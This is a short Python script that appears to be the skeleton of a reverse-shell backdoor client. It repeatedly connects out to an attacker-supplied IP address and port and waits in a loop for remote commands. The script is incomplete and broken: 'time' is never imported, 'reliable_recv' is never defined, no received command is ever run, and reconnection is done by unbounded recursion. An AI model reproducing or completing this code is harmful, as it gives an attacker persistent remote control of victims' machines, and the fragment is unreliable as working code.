import socket
ip_addr = input("IP Address of target >>> ")
port = int(input("port to listen >>> "))

def connection():
    while True:
        time.sleep(20)
        try: 
            s.connect((ip_addr, port))
            shell()
            s.close()
        except:
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command == "quit" :
            break

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()